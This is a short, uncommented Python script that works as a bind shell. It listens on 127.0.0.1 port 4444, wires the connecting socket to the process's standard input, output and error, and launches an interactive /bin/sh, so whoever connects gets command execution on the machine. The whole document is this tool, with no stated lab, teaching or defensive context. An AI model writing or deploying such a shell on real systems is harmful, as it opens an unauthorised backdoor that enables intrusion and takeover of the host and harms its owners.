import socket, subprocess, os

port=4444

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.bind(("127.0.0.1", port))
s.listen(5)

conn, addr = s.accept()

os.dup2(conn.fileno(),0)
os.dup2(conn.fileno(),1)
os.dup2(conn.fileno(),2)

p = subprocess.call(["/bin/sh", "-i"])
